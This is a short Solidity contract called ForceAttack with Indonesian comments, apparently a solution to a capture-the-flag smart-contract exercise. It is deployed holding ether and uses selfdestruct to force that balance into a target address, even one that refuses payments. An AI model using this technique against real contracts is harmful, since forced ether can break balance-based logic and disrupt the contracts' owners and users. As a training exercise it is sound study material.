// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    // Kita butuh fungsi constructor yang 'payable'
    // agar saat kita deploy kontrak ini, kita bisa sekaligus mengisi saldonya.
    constructor() payable {}

    // Fungsi untuk melakukan serangan bunuh diri
    function attack(address payable _target) public {
        // selfdestruct akan mengirim seluruh sisa saldo kontrak ini
        // ke alamat _target secara PAKSA.
        selfdestruct(_target);
    }
}